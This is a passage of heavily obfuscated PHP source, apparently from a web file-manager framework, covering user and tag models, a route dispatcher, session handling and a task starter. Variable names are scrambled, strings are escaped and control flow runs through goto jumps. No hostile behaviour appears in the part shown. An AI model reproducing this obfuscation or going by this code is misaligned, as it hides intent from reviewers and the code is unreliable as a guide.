count($bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[351]]), $DËÇ¨À˜Î…[2257] => $bÎÁÊ¸ÃÎ[$DËÇ¨À˜Î…[348]][$DËÇ¨À˜Î…[346]], $DËÇ¨À˜Î…[2256] => 1, $DËÇ¨À˜Î…[2258] => 1); } private function _searchFromMeta($CÜ°ƒ†Ó, $f‘î¢ÓÁ , $F„¿Øºâíß) { goto aÎ¬ø£íê’; FÄîš¬„Ò: $BÈˆéïì‡§ = $this->where(array($F˜ç·¾ÆÒ[1392] => array($F˜ç·¾ÆÒ[7], $dŠ‡ì³¨»Æ)))->select(); if (!$BÈˆéïì‡§) { return array(); } return $BÈˆéïì‡§; goto BÑºØ·ÇëÂ; aÎ¬ø£íê’: $F˜ç·¾ÆÒ =& $_SERVER[£ü]; $f‘î¢ÓÁ  = strtolower($f‘î¢ÓÁ ); $B‡á»¸Ã”Ë = array($F˜ç·¾ÆÒ[89] => $CÜ°ƒ†Ó, $F˜ç·¾ÆÒ[356] => array($F˜ç·¾ÆÒ[747], "\x25{$f‘î¢ÓÁ }\x25")); goto d‰ì‹…©—; d‰ì‹…©—: $dŠ‡ì³¨»Æ = Model($F˜ç·¾ÆÒ[2484])->where($B‡á»¸Ã”Ë)->limit($F„¿Øºâíß)->select(); if (!$dŠ‡ì³¨»Æ) { return array(); } $dŠ‡ì³¨»Æ = array_to_keyvalue($dŠ‡ì³¨»Æ, $F˜ç·¾ÆÒ[33], $F˜ç·¾ÆÒ[1401]); goto FÄîš¬„Ò; BÑºØ·ÇëÂ: } private function _listDataApplyItem($a™­‘œùğÄ) { $b‰Ãòø° = array($a™­‘œùğÄ); $this->_listDataApply($b‰Ãòø°); return $b‰Ãòø°[0]; } private function _listDataApply(&$bÅÛ×è¼¨¸) { goto e¹Âä‚¤îÔ; d×ØØ¶¢ : $this->_listAppendSourceRoot($bÅÛ×è¼¨¸, $eÈßÛ‰Áœ³); goto F³çÈ¢Ï„é; FÛª–§İĞ¬: $eÈßÛ‰Áœ³ = array_to_keyvalue($bÅÛ×è¼¨¸, $cëÙïÚ£ÄÀ[33], $cëÙïÚ£ÄÀ[1401]); $this->_listAppendGroup($bÅÛ×è¼¨¸, $eÈßÛ‰Áœ³); $this->_listAppendMeta($bÅÛ×è¼¨¸, $eÈßÛ‰Áœ³); goto d×ØØ¶¢ ; e¹Âä‚¤îÔ: $cëÙïÚ£ÄÀ =& $_SERVER[£ü]; if (!$bÅÛ×è¼¨¸) { return; } array_remove_key($bÅÛ×è¼¨¸, $cëÙïÚ£ÄÀ[792]); goto FÛª–§İĞ¬; F³çÈ¢Ï„é: } private function _listAppendSourceRoot(&$B‰İÉÖ”ŒÏ, $C„Èˆ“‰Ğ„) { goto AÇÎï¹®· ; c°ËŒ»ø¹„: foreach ($B‰İÉÖ”ŒÏ as &$EƒğÆÓ…ÛÀ) { $EƒğÆÓ…ÛÀ[$f­ß‹Öìõ[388]] = $dĞèÒÖõÛî[$EƒğÆÓ…ÛÀ[$f­ß‹Öìõ[1401]]] ? $dĞèÒÖõÛî[$EƒğÆÓ…ÛÀ[$f­ß‹Öìõ[1401]]] : array(); } goto FôõÍ‘¸ÙÈ; AÇÎï¹®· : $f­ß‹Öìõ =& $_SERVER[£ü]; $aÍ«‹Ú©ã = array($f­ß‹Öìõ[457] => 0, $f­ß‹Öìõ[368] => SourceModel::TYPE_USER, $f­ß‹Öìõ[452] => array($f­ß‹Öìõ[7], $C„Èˆ“‰Ğ„)); $b×´´Š™Î = $f­ß‹Öìõ[2150]; goto eàÂ¥Í¨Ç™; eàÂ¥Í¨Ç™: $dĞèÒÖõÛî = Model($f­ß‹Öìõ[748])->order($f­ß‹Öìõ[2151])->field($b×´´Š™Î)->where($aÍ«‹Ú©ã)->select(); $dĞèÒÖõÛî = array_to_keyvalue($dĞèÒÖõÛî, $f­ß‹Öìõ[452]); $dĞèÒÖõÛî = array_remove_key($dĞèÒÖõÛî, $f­ß‹Öìõ[452]); goto c°ËŒ»ø¹„; FôõÍ‘¸ÙÈ: } private function _listAppendGroup(&$fÓ¨òò‹¼, $bòÒíÁ”£…) { goto eö—ŒÙãìÍ; fäÉõëÊäÌ: $bâÉİç« = array_to_keyvalue_group($bâÉİç«, $d¦Ó æÖ[1401]); foreach ($bâÉİç« as &$DÈ¬ˆóì©²) { $DÒº˜ŒªÚ— = array(); foreach ($DÈ¬ˆóì©² as $AğõõÃµâª) { if (!$AğõõÃµâª[$d¦Ó æÖ[2192]]) { continue; } $F˜Ó¿‚å§ = Model($d¦Ó æÖ[2211])->listData($AğõõÃµâª[$d¦Ó æÖ[2192]]); $DÒº˜ŒªÚ—[] = array($d¦Ó æÖ[2064] => $AğõõÃµâª[$d¦Ó æÖ[2064]], $d¦Ó æÖ[2487] => $bä£‹«Üô“[$AğõõÃµâª[$d¦Ó æÖ[2064]]], $d¦Ó æÖ[373] => $F˜Ó¿‚å§); } $DÈ¬ˆóì©² = $DÒº˜ŒªÚ—; } foreach ($fÓ¨òò‹¼ as &$dî… »ã¥Á) { $dî… »ã¥Á[$d¦Ó æÖ[2483]] = array(); if (isset($bâÉİç«[$dî… »ã¥Á[$d¦Ó æÖ[1401]]])) { $dî… »ã¥Á[$d¦Ó æÖ[2483]] = $bâÉİç«[$dî… »ã¥Á[$d¦Ó æÖ[1401]]]; } } goto fáù¬•™º; aµìÔØ§ì: $aÃèàĞ‹œ = array($d¦Ó æÖ[2064] => array($d¦Ó æÖ[7], $d„Š¿ÌäŠ)); $Bğ«œêóâ¼ = Model($d¦Ó æÖ[2485])->field($d¦Ó æÖ[2486])->where($aÃèàĞ‹œ)->select(); $bä£‹«Üô“ = array_to_keyvalue($Bğ«œêóâ¼, $d¦Ó æÖ[2064], $d¦Ó æÖ[28]); goto fäÉõëÊäÌ; Aºƒ§õºÛğ: $d„Š¿ÌäŠ = array_to_keyvalue($bâÉİç«, $d¦Ó æÖ[33], $d¦Ó æÖ[2064]); $d„Š¿ÌäŠ = array_remove_value(array_unique($d„Š¿ÌäŠ), $d¦Ó æÖ[464]); if (!$d„Š¿ÌäŠ || !$bâÉİç«) { return; } goto aµìÔØ§ì; eö—ŒÙãìÍ: $d¦Ó æÖ =& $_SERVER[£ü]; $aÃèàĞ‹œ = array($d¦Ó æÖ[1401] => array($d¦Ó æÖ[7], $bòÒíÁ”£…)); $bâÉİç« = Model($d¦Ó æÖ[2138])->where($aÃèàĞ‹œ)->select(); goto Aºƒ§õºÛğ; fáù¬•™º: } private function _listAppendMeta(&$d¦Ä¡Û—†, $DŸ¸Ùœë‡«) { goto f‹‘ù¬—ñ¼; CŒ–ùÍ¬¬à: $cŒ¥¾µ¶ñÛ = array($D‚‰ÛâóÓç[1401] => array($D‚‰ÛâóÓç[7], $DŸ¸Ùœë‡«)); $aéóÑŠÕ‚ = Model($D‚‰ÛâóÓç[2461])->where($cŒ¥¾µ¶ñÛ)->select(); $aéóÑŠÕ‚ = array_to_keyvalue_group($aéóÑŠÕ‚, $D‚‰ÛâóÓç[1401]); goto F¨ÙôòÀ‰™; f‹‘ù¬—ñ¼: $D‚‰ÛâóÓç =& $_SERVER[£ü]; $E»Şèµò’ = UserJobModel::JOB_KEY; $c°‚Ô³æ›½ = array($D‚‰ÛâóÓç[2464]); goto CŒ–ùÍ¬¬à; F¨ÙôòÀ‰™: foreach ($aéóÑŠÕ‚ as &$Aã¡âŸŞÜ¿) { $aì¯Ä´Âõ¤ = array(); foreach ($Aã¡âŸŞÜ¿ as $BÎùÄ´Æ°¤) { if (!in_array($BÎùÄ´Æ°¤[$D‚‰ÛâóÓç[89]], $c°‚Ô³æ›½)) { $aì¯Ä´Âõ¤[$BÎùÄ´Æ°¤[$D‚‰ÛâóÓç[89]]] = $BÎùÄ´Æ°¤[$D‚‰ÛâóÓç[356]]; } } $Aã¡âŸŞÜ¿ = $aì¯Ä´Âõ¤; } $C¨¡ËÊÕºƒ = Model($D‚‰ÛâóÓç[2488]); foreach ($d¦Ä¡Û—† as &$dèÑÂø–ÏŠ) { $cÎÓäœ£ = array(); if (isset($aéóÑŠÕ‚[$dèÑÂø–ÏŠ[$D‚‰ÛâóÓç[1401]]])) { $cÎÓäœ£ = $aéóÑŠÕ‚[$dèÑÂø–ÏŠ[$D‚‰ÛâóÓç[1401]]]; } $dèÑÂø–ÏŠ[$D‚‰ÛâóÓç[2489]] = array(); if (isset($cÎÓäœ£[$E»Şèµò’])) { $dèÑÂø–ÏŠ[$D‚‰ÛâóÓç[2489]] = $C¨¡ËÊÕºƒ->getUserJobInfo($cÎÓäœ£[$E»Şèµò’]); } } goto E¢À£Ñè; E¢À£Ñè: } public function userSearch($e½ìç¥³Õğ, $D¿‘æ´‘“› = "\x2a") { return Model($_SERVER[£ü][473])->where($e½ìç¥³Õğ)->field($D¿‘æ´‘“›)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\157\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($B·®ÁçåÛØ) { return "\125\x73\145\x72\117\160\164\x69\x6f\x6e\137{$B·®ÁçåÛØ}\x5f" . USER_ID; } protected function filterWhere($d¦ŞÜ±£¼) { $d¦ŞÜ±£¼[$_SERVER[£ü][1401]] = USER_ID; return $d¦ŞÜ±£¼; } public function cacheRemoveUser($AöÀ‹§˜ã®, $eÎ¬ä†¶Ù) { return Cache::remove("\125\x73\145\x72\x4f\160\x74\151\157\156\137{$AöÀ‹§˜ã®}\137" . $eÎ¬ä†¶Ù); } protected function optionDefault($DŠ×òĞÓÃ‚ = '') { $CÑÒÉ ëáÜ =& $_SERVER[£ü]; if ($DŠ×òĞÓÃ‚ == $CÑÒÉ ëáÜ[33]) { return $GLOBALS[$CÑÒÉ ëáÜ[6]][$CÑÒÉ ëáÜ[2490]]; } if ($DŠ×òĞÓÃ‚ == $CÑÒÉ ëáÜ[2491]) { return $GLOBALS[$CÑÒÉ ëáÜ[6]][$CÑÒÉ ëáÜ[2492]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\x74\x61\147\114\151\163\x74"; public $modelType = "\x55\163\145\x72\x4f\x70\164\151\157\156"; public $field = array("\156\141\x6d\145", "\x73\x74\x79\154\145", "\163\x6f\162\x74"); public function listData($F²¦Ó¨æ… = false, $CšßÜ´´ = "\x73\x6f\x72\164", $a§Ó›æ¼¾³ = false) { return parent::listData($F²¦Ó¨æ…, $CšßÜ´´, $a§Ó›æ¼¾³); } public function remove($cë¨ùõ‘º„) { return parent::remove($cë¨ùõ‘º„); } public function add($FÖ—­±•, $b²âÀ”å²÷ = "\x6c\x61\x62\145\x6c\x2d\147\162\145\x79\x2d\156\157\x72\155\141\154") { $dÒ„¤¾õ‰¥ =& $_SERVER[£ü]; if ($this->findByName($FÖ—­±•)) { return !1; } $E²ÃÏïï± = array($dÒ„¤¾õ‰¥[383] => $FÖ—­±•, $dÒ„¤¾õ‰¥[433] => $b²âÀ”å²÷, $dÒ„¤¾õ‰¥[2068] => $this->getSort($dÒ„¤¾õ‰¥[243]) + 1); return parent::insert($E²ÃÏïï±); } public function update($Cøâ­ôƒ¨µ, $eŞ•ù»”ÊÙ) { $BŠç«Éó Í =& $_SERVER[£ü]; $BˆäÀêÂ = $this->listData($Cøâ­ôƒ¨µ); $Dµ¯‰Ì¥ğÀ = $this->findByName($eŞ•ù»”ÊÙ[$BŠç«Éó Í[28]]); if (!$BˆäÀêÂ || $Dµ¯‰Ì¥ğÀ && $Dµ¯‰Ì¥ğÀ[$BŠç«Éó Í[364]] != $BˆäÀêÂ[$BŠç«Éó Í[364]]) { return !1; } return parent::update($Cøâ­ôƒ¨µ, $eŞ•ù»”ÊÙ); } public function moveTop($EÂ áÙÍÂó) { $b„âñÅ ¥† =& $_SERVER[£ü]; $bæõƒ”Ô¬‹ = parent::listData(); $c—ÔÕ»ŸŠË = $this->getSort($b„âñÅ ¥†[242]); foreach ($bæõƒ”Ô¬‹ as &$e³¬¡ÀÄ®É) { if ($e³¬¡ÀÄ®É[$b„âñÅ ¥†[364]] == $EÂ áÙÍÂó) { $e³¬¡ÀÄ®É[$b„âñÅ ¥†[2085]] = $c—ÔÕ»ŸŠË; continue; } $e³¬¡ÀÄ®É[$b„âñÅ ¥†[2085]] += 1; } return parent::resetData($bæõƒ”Ô¬‹); } public function moveBottom($DÛ«Ô¸„²Í) { $CÕ—ˆÈ¼ù =& $_SERVER[£ü]; $cèõÀ§±Õ = $this->getSort($CÕ—ˆÈ¼ù[243]) + 1; return parent::update($DÛ«Ô¸„²Í, array($CÕ—ˆÈ¼ù[2085] => $cèõÀ§±Õ)); } public function resetSort($A›•Ó«´») { goto aåâ¨°ˆµ; aåâ¨°ˆµ: $EÛ¼„ã’åº =& $_SERVER[£ü]; $e™êí…»Ù× = array(); $A›•Ó«´» = is_array($A›•Ó«´») ? $A›•Ó«´» : array(); goto B¢¥êÖÜ„Ï; FŞ™Ôò® : return parent::resetData($fŒõˆÉ¯ÅŞ); goto Eì‘¿ÜÇ—à; B¢¥êÖÜ„Ï: for ($eÄì“ßÃùò = 0; $eÄì“ßÃùò < count($A›•Ó«´»); $eÄì“ßÃùò++) { $e™êí…»Ù×[$A›•Ó«´»[$eÄì“ßÃùò] . $EÛ¼„ã’åº[33]] = $eÄì“ßÃùò + 1; } $fŒõˆÉ¯ÅŞ = parent::listData(); foreach ($fŒõˆÉ¯ÅŞ as &$c£ó‡Âªä) { $bƒÖ‚¤„ƒ­ = $e™êí…»Ù×[$c£ó‡Âªä[$EÛ¼„ã’åº[364]]]; $c£ó‡Âªä[$EÛ¼„ã’åº[2085]] = $bƒÖ‚¤„ƒ­ ? $bƒÖ‚¤„ƒ­ : $c£ó‡Âªä[$EÛ¼„ã’åº[2085]]; } goto FŞ™Ôò® ; Eì‘¿ÜÇ—à: } private function getSort($dŞ…ˆ‡Ïæ) { $B‡†ñ¸è¥® =& $_SERVER[£ü]; $A¡Û‘ÛÀ´á = parent::listData(); $añ‹Õ…»íì = array_to_keyvalue($A¡Û‘ÛÀ´á, $B‡†ñ¸è¥®[33], $B‡†ñ¸è¥®[2085]); if (!$añ‹Õ…»íì) { $añ‹Õ…»íì = array(0); } $DÜ¶§“È¾ß = $dŞ…ˆ‡Ïæ == $B‡†ñ¸è¥®[243] ? max($añ‹Õ…»íì) : min($añ‹Õ…»íì); return intval($DÜ¶§“È¾ß); } } goto AØí¦¼áÈ£; aË³ç¢ç¿: function Action($EĞ›œÒïÃ = '') { goto aŞ£®§ˆ†; A†Îåáƒƒ”: if (!class_exists($EÒ¨”×‚íç)) { return actionCallError("\133{$EĞ›œÒïÃ}\40\x3d\x3e\x20{$EÒ¨”×‚íç}\x5d\40\143\154\x61\x73\163\40\156\x6f\164\40\x65\x78\x69\x73\164\163\41"); } $CëŒ•»¬…[$d°Ğ¥¥§´] = new $EÒ¨”×‚íç(); return $CëŒ•»¬…[$d°Ğ¥¥§´]; goto A……‡Û˜Û«; EŠ£ğÖ´‚º: $d°Ğ¥¥§´ = strtolower($EÒ¨”×‚íç); if (isset($CëŒ•»¬…[$d°Ğ¥¥§´])) { return $CëŒ•»¬…[$d°Ğ¥¥§´]; } if (is_file($d­Ä‚¬î‰)) { include_once $d­Ä‚¬î‰; } goto A†Îåáƒƒ”; aŞ£®§ˆ†: $e¬ÂÙ¬Ğ¾ó =& $_SERVER[ĞÔ]; static $CëŒ•»¬… = array(); $EĞ›œÒïÃ = trim(str_replace($e¬ÂÙ¬Ğ¾ó[4], $e¬ÂÙ¬Ğ¾ó[5], $EĞ›œÒïÃ), $e¬ÂÙ¬Ğ¾ó[4]); goto fÆ•°¯—«; fÆ•°¯—«: $bŞğ³„ØÖ = explode($e¬ÂÙ¬Ğ¾ó[5], $EĞ›œÒïÃ); $E±ˆ‡­º¥ë = strtolower($bŞğ³„ØÖ[0]); if (substr($E±ˆ‡­º¥ë, -6) == $e¬ÂÙ¬Ğ¾ó[6]) { $EĞ›œÒïÃ = substr($bŞğ³„ØÖ[0], 0, -6); $EÒ¨”×‚íç = $EĞ›œÒïÃ . $e¬ÂÙ¬Ğ¾ó[7]; $d­Ä‚¬î‰ = $e¬ÂÙ¬Ğ¾ó[8]; if (isset($bŞğ³„ØÖ[1]) && substr(strtolower($bŞğ³„ØÖ[1]), -5) == $e¬ÂÙ¬Ğ¾ó[9]) { $EÒ¨”×‚íç = $EĞ›œÒïÃ . $bŞğ³„ØÖ[1]; $d­Ä‚¬î‰ = $e¬ÂÙ¬Ğ¾ó[10] . $bŞğ³„ØÖ[1] . $e¬ÂÙ¬Ğ¾ó[11]; } else { if (count($bŞğ³„ØÖ) == 3) { $EÒ¨”×‚íç = $EĞ›œÒïÃ . $bŞğ³„ØÖ[1] . $bŞğ³„ØÖ[2]; $d­Ä‚¬î‰ = $e¬ÂÙ¬Ğ¾ó[12] . $bŞğ³„ØÖ[1] . $e¬ÂÙ¬Ğ¾ó[13] . $bŞğ³„ØÖ[2] . $e¬ÂÙ¬Ğ¾ó[11]; } } $d­Ä‚¬î‰ = PLUGIN_DIR . $EĞ›œÒïÃ . $e¬ÂÙ¬Ğ¾ó[4] . $d­Ä‚¬î‰; } else { if (substr($E±ˆ‡­º¥ë, -5) == $e¬ÂÙ¬Ğ¾ó[9]) { $EĞ›œÒïÃ = substr($bŞğ³„ØÖ[0], 0, -5); return Model($EĞ›œÒïÃ); } else { $EÒ¨”×‚íç = $bŞğ³„ØÖ[0] . $bŞğ³„ØÖ[1]; $d­Ä‚¬î‰ = CONTROLLER_DIR . $bŞğ³„ØÖ[0] . $e¬ÂÙ¬Ğ¾ó[4] . $bŞğ³„ØÖ[1] . $e¬ÂÙ¬Ğ¾ó[14]; } } goto EŠ£ğÖ´‚º; A……‡Û˜Û«: } function ActionApply($Cİõ¥µÒ´ˆ, $Cµ““‘œœ = array()) { goto a’½ì­åàì; a’½ì­åàì: if (is_array($Cİõ¥µÒ´ˆ)) { return call_user_func_array($Cİõ¥µÒ´ˆ, $Cµ““‘œœ); } if (function_exists($Cİõ¥µÒ´ˆ)) { return call_user_func_array($Cİõ¥µÒ´ˆ, $Cµ““‘œœ); } $dÕàñ­„õ = strrpos($Cİõ¥µÒ´ˆ, $_SERVER[ĞÔ][5]); goto eºæÔñö±Ğ; eºæÔñö±Ğ: $Fí‡øì¥æÜ = substr($Cİõ¥µÒ´ˆ, 0, $dÕàñ­„õ); $EƒèæŒ¤‹· = substr($Cİõ¥µÒ´ˆ, $dÕàñ­„õ + 1); $Dù£„ìÆ„ = Action($Fí‡øì¥æÜ); goto B¹”ËÀÃÌí; B¹”ËÀÃÌí: if (!method_exists($Dù£„ìÆ„, $EƒèæŒ¤‹·)) { return actionCallError("{$Cİõ¥µÒ´ˆ}\40\x6d\x65\x74\x68\x6f\x64\40\x6e\x6f\164\x20\145\x78\151\x73\x74\x73\x21"); } $CÈÇù«Î«« = call_user_func_array(array($Dù£„ìÆ„, $EƒèæŒ¤‹·), $Cµ““‘œœ); return $CÈÇù«Î««; goto E‚É™¨ö½; E‚É™¨ö½: } function actionCallError($f÷‘š‡„Ÿ®) { $D¸ùº¤‚ =& $_SERVER[ĞÔ]; $dä­ƒİ Å† = json_encode_force(array($D¸ùº¤‚[15] => this_url(), $D¸ùº¤‚[16] => $GLOBALS[$D¸ùº¤‚[16]])); $dä­ƒİ Å† = str_replace(array($D¸ùº¤‚[17]), array($D¸ùº¤‚[4]), $dä­ƒİ Å†); return write_log($f÷‘š‡„Ÿ® . $D¸ùº¤‚[18] . $dä­ƒİ Å†, $D¸ùº¤‚[19]); } goto E‘«Ş•ŞŞ; C¢·¥µòé: function beforeShutdownFatalError($CËŠ¶¨Ş‚’) { think_exception($CËŠ¶¨Ş‚’); } $_SERVER[$_SERVER[ĞÔ][48]] = $fÒ÷ÛÑñö($_SERVER[$_SERVER[ĞÔ][45]]); $a‡©ğ‚¡Ê¢ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto e—İÓ÷ö­ì; B÷ŠàÄß¶¯: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\136\x2f\135\53", "\x3a\x6e\165\x6d" => "\x5b\x30\x2d\71\135\x2b", "\72\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($B«Êôí•Ï’, $b§øé”ô°¨) { $AÁŒÊ¹»­ =& $_SERVER[£ü]; if ($B«Êôí•Ï’ == $AÁŒÊ¹»­[1350]) { $A“ÍŸŒØ£ = array_map($AÁŒÊ¹»­[1351], $b§øé”ô°¨[0]); $BùÈØ–ˆÓ = strpos($b§øé”ô°¨[1], $AÁŒÊ¹»­[8]) === 0 ? $b§øé”ô°¨[1] : $AÁŒÊ¹»­[8] . $b§øé”ô°¨[1]; $EÇ•­Ü„§Ä = $b§øé”ô°¨[2]; } else { $A“ÍŸŒØ£ = null; $BùÈØ–ˆÓ = strpos($b§øé”ô°¨[0], $AÁŒÊ¹»­[8]) === 0 ? $b§øé”ô°¨[0] : $AÁŒÊ¹»­[8] . $b§øé”ô°¨[0]; $EÇ•­Ü„§Ä = $b§øé”ô°¨[1]; } array_push(self::$maps, $A“ÍŸŒØ£); array_push(self::$routes, $BùÈØ–ˆÓ); array_push(self::$methods, strtoupper($B«Êôí•Ï’)); array_push(self::$callbacks, $EÇ•­Ü„§Ä); } public static function error($e—ÀÑ†Ö§º) { self::$errorCallback = $e—ÀÑ†Ö§º; } public static function haltOnMatch($BÏóÚë®Ìè = true) { self::$halts = $BÏóÚë®Ìè; } public static function dispatch() { goto D‘²‰¹; D‘²‰¹: $e‹®ˆöŞëÉ =& $_SERVER[£ü]; $Fá²ß×Õåâ = parse_url($_SERVER[$e‹®ˆöŞëÉ[1352]], PHP_URL_PATH); $B÷•Á¥¬›à = $_SERVER[$e‹®ˆöŞëÉ[151]]; goto C¸›ƒ¸Ã©ä; bïÓšîÊ”©: self::$routes = preg_replace($e‹®ˆöŞëÉ[1063], $e‹®ˆöŞëÉ[8], self::$routes); if (in_array($Fá²ß×Õåâ, self::$routes)) { $e¹ÅÆø†Ôá = array_keys(self::$routes, $Fá²ß×Õåâ); foreach ($e¹ÅÆø†Ôá as $e«‚«¬‰“) { if (self::$methods[$e«‚«¬‰“] == $B÷•Á¥¬›à || self::$methods[$e«‚«¬‰“] == $e‹®ˆöŞëÉ[1353] || in_array($B÷•Á¥¬›à, self::$maps[$e«‚«¬‰“])) { $cÖ¨ğ×Æ‰ã = !0; if (!is_object(self::$callbacks[$e«‚«¬‰“])) { $BÒ‚æ©Óöº = explode($e‹®ˆöŞëÉ[8], self::$callbacks[$e«‚«¬‰“]); $e¡÷é¤©Ä = end($BÒ‚æ©Óöº); $a†ï¡Ï‰«µ = explode($e‹®ˆöŞëÉ[1354], $e¡÷é¤©Ä); $fâá–ì£ïÂ = new $a†ï¡Ï‰«µ[0](); $fâá–ì£ïÂ->{$a†ï¡Ï‰«µ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e«‚«¬‰“]); if (self::$halts) { return; } } } } } else { $aé•¨êÉ”İ = 0; foreach (self::$routes as $e«‚«¬‰“) { if (strpos($e«‚«¬‰“, $e‹®ˆöŞëÉ[4]) !== !1) { $e«‚«¬‰“ = str_replace($cÈØÔõÃ³©, $bí™ô± šã, $e«‚«¬‰“); } if (preg_match($e‹®ˆöŞëÉ[1355] . $e«‚«¬‰“ . $e‹®ˆöŞëÉ[1356], $Fá²ß×Õåâ, $F›„ºŠÛ†œ)) { if (self::$methods[$aé•¨êÉ”İ] == $B÷•Á¥¬›à || self::$methods[$aé•¨êÉ”İ] == $e‹®ˆöŞëÉ[1353] || !empty(self::$maps[$aé•¨êÉ”İ]) && in_array($B÷•Á¥¬›à, self::$maps[$aé•¨êÉ”İ])) { $cÖ¨ğ×Æ‰ã = !0; array_shift($F›„ºŠÛ†œ); if (!is_object(self::$callbacks[$aé•¨êÉ”İ])) { $BÒ‚æ©Óöº = explode($e‹®ˆöŞëÉ[8], self::$callbacks[$aé•¨êÉ”İ]); $e¡÷é¤©Ä = end($BÒ‚æ©Óöº); $a†ï¡Ï‰«µ = explode($e‹®ˆöŞëÉ[1354], $e¡÷é¤©Ä); $fâá–ì£ïÂ = new $a†ï¡Ï‰«µ[0](); if (!method_exists($fâá–ì£ïÂ, $a†ï¡Ï‰«µ[1])) { echo $e‹®ˆöŞëÉ[1357]; } else { call_user_func_array(array($fâá–ì£ïÂ, $a†ï¡Ï‰«µ[1]), $F›„ºŠÛ†œ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$aé•¨êÉ”İ], $F›„ºŠÛ†œ); if (self::$halts) { return; } } } } $aé•¨êÉ”İ++; } } if ($cÖ¨ğ×Æ‰ã == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $B¯²Ù›ˆ®£ =& $_SERVER[£ü]; header($_SERVER[$B¯²Ù›ˆ®£[1358]] . $B¯²Ù›ˆ®£[1359]); echo $B¯²Ù›ˆ®£[1360]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$e‹®ˆöŞëÉ[1352]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto c¢›ÎµàÄó; C¸›ƒ¸Ã©ä: $cÈØÔõÃ³© = array_keys(static::$patterns); $bí™ô± šã = array_values(static::$patterns); $cÖ¨ğ×Æ‰ã = !1; goto bïÓšîÊ”©; c¢›ÎµàÄó: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto dÃ¢Íõ¬Éñ; fò­†¼¹: $C›Àî³ÁÉÌ = _get($GLOBALS, $dĞ½‰ÊŠ—[1362], $C›Àî³ÁÉÌ); if (self::$sessionSign) { } else { if (Cookie::get($C›Àî³ÁÉÌ)) { self::$sessionSign = Cookie::get($C›Àî³ÁÉÌ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($C›Àî³ÁÉÌ, self::$sessionSign, self::$sessionTime); goto dšğº‰…ÃÌ; dòÛ†Ğ¨Ò•: $c’Ë˜ŠóÉø = $GLOBALS[$dĞ½‰ÊŠ—[6]][$dĞ½‰ÊŠ—[334]]; self::$sessionTime = $c’Ë˜ŠóÉø[$dĞ½‰ÊŠ—[1361]]; $C›Àî³ÁÉÌ = SESSION_ID; goto fò­†¼¹; dšğº‰…ÃÌ: $fÇÆË®ŸÚ¨ = $c’Ë˜ŠóÉø[$dĞ½‰ÊŠ—[1363]]; $EåÒ›’Îİ® = $c’Ë˜ŠóÉø[$fÇÆË®ŸÚ¨]; $d½¡‡²Àç = $c’Ë˜ŠóÉø[$dĞ½‰ÊŠ—[750]]; goto a…«İªÖ½ë; eÅÂğ¡ƒÛ‰: return $DØÑ–¾ùÚê; goto C•ƒ•ïèÇ; a…«İªÖ½ë: switch ($fÇÆË®ŸÚ¨) { case $dĞ½‰ÊŠ—[17]: self::$handle = Model($dĞ½‰ÊŠ—[751]); break; case $dĞ½‰ÊŠ—[752]: self::$handle = new CacheRedis($EåÒ›’Îİ®, $d½¡‡²Àç); break; case $dĞ½‰ÊŠ—[753]: self::$handle = new CacheMemcached($EåÒ›’Îİ®, $d½¡‡²Àç); break; case $dĞ½‰ÊŠ—[164]: $EåÒ›’Îİ®[$dĞ½‰ÊŠ—[75]] = $EåÒ›’Îİ®[$dĞ½‰ÊŠ—[75]] . $dĞ½‰ÊŠ—[1364]; self::$handle = new CacheFile($EåÒ›’Îİ®, $d½¡‡²Àç); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $DØÑ–¾ùÚê = new self(); goto eÅÂğ¡ƒÛ‰; dÃ¢Íõ¬Éñ: $dĞ½‰ÊŠ— =& $_SERVER[£ü]; static $DØÑ–¾ùÚê = false; if ($DØÑ–¾ùÚê) { return $DØÑ–¾ùÚê; } goto dòÛ†Ğ¨Ò•; C•ƒ•ïèÇ: } public static function sign($A¿…¤Úëß„ = false) { $A¿…¤Úëß„ && (self::$sessionSign = $A¿…¤Úëß„); self::init(); return self::$sessionSign; } public static function set($báæ‡ŒÎ‚, $D¯²ÖÏ’Íí = false) { self::init(); if (is_array($báæ‡ŒÎ‚)) { foreach ($báæ‡ŒÎ‚ as $Aí³†™Ğë => $F©ì—˜”ï) { array_set_value(self::$data, $Aí³†™Ğë, $F©ì—˜”ï); } } else { array_set_value(self::$data, $báæ‡ŒÎ‚, $D¯²ÖÏ’Íí); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($B†ÏÌøÓ—• = false) { self::init(); if (!$B†ÏÌøÓ—•) { return self::$data; } return array_get_value(self::$data, $B†ÏÌøÓ—•); } public static function remove($Fµ›¸ÚÛÏ) { self::init(); unset(self::$data[$Fµ›¸ÚÛÏ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[£ü][755])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto dÕ‹ÚÙ¨ëš; dÕ‹ÚÙ¨ëš: $fº²ËÙ¦ =& $_SERVER[£ü]; if (self::valueGet($fº²ËÙ¦[678]) != $fº²ËÙ¦[83]) { return; } if (self::valueGet($fº²ËÙ¦[1365]) == 